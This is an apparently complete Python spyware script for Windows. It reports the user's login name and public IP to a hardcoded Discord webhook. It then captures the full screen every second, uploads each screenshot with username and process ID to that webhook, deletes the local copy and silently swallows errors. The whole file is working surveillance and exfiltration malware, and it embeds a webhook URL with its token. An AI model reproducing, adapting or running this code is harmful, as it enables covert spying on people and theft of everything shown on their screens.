import os
import ctypes,struct,zlib
import urllib.request
import json,time

WEBHOOK_URL = "https://discord.com/api/webhooks/1500087473517101219/u6NySBC5Q--zb-z-sbOERTqiuHXiVlHObma1jfYCKt9rIQgF0Ii48bueUlezzMbMLwlD"
OUTPUT_NAME = "output"

def ip():
    try:
        with urllib.request.urlopen("https://api.ipify.org", timeout=5) as response:
            return response.read().decode().strip()
    except:return None

def grab_scr(filename="output"):
    u,g=ctypes.windll.user32,ctypes.windll.gdi32;w,h=u.GetSystemMetrics(0),u.GetSystemMetrics(1);s=u.GetDC(0);m=g.CreateCompatibleDC(s);b=g.CreateCompatibleBitmap(s,w,h);g.SelectObject(m,b);g.BitBlt(m,0,0,w,h,s,0,0,0xCC0020);i,d=ctypes.create_string_buffer(40),ctypes.create_string_buffer(w*h*4);struct.pack_into('IiiHHIIiiII',i,0,40,w,-h,1,32,0,0,0,0,0,0);g.GetDIBits(m,b,0,h,d,i,0);c=lambda t,x:struct.pack('>I',len(x))+(z:=t+x)+struct.pack('>I',zlib.crc32(z)&0xffffffff);r=bytearray()
    for y in range(h):
        r.append(0);p=d.raw[y*w*4:(y+1)*w*4]
        for x in range(0,w*4,4):r.extend([p[x+2],p[x+1],p[x],p[x+3]])
    open(str(filename)+".png",'wb').write(b'\x89PNG\r\n\x1a\n'+c(b'IHDR',struct.pack('>IIBBBBB',w,h,8,6,0,0,0))+c(b'IDAT',zlib.compress(bytes(r),9))+c(b'IEND',b''));g.DeleteObject(b);g.DeleteDC(m);u.ReleaseDC(0,s)

def send_image(webhook_url, image_path=None):
    try:
        if image_path and os.path.isfile(image_path):
            boundary = '----WebKitFormBoundary' + ''.join([hex(ord(c))[2:] for c in os.urandom(16).hex()[:16]])
            with open(image_path, "rb") as file:
                info = str(os.getlogin()) +" | "+ str(os.getpid())
                body = (
                    f'--{boundary}\r\n'
                    f'Content-Disposition: form-data; name="content"\r\n\r\n'
                    f'{info}\r\n'
                    f'--{boundary}\r\n'
                    f'Content-Disposition: form-data; name="file"; filename="{os.path.basename(image_path)}"\r\n'
                    f'Content-Type: image/png\r\n\r\n'
                ).encode() + file.read() + f'\r\n--{boundary}--\r\n'.encode()
                
                req = urllib.request.Request(webhook_url, data=body, headers={'Content-Type': f'multipart/form-data; boundary={boundary}'})
                urllib.request.urlopen(req, timeout=10)
        else: raise ValueError
    except: pass

data = json.dumps({"content": "***" + os.getlogin().upper() + "*** IS UP! IP: ``"+ ip() + "``"}).encode()
req = urllib.request.Request(WEBHOOK_URL, data=data, headers={'Content-Type': 'application/json'})
urllib.request.urlopen(req, timeout=10)

while True:
    grab_scr(OUTPUT_NAME)
    send_image(WEBHOOK_URL, str(OUTPUT_NAME)+".png")
    if os.path.isfile(str(OUTPUT_NAME)+".png"):os.remove(str(OUTPUT_NAME)+".png")
    time.sleep(1)
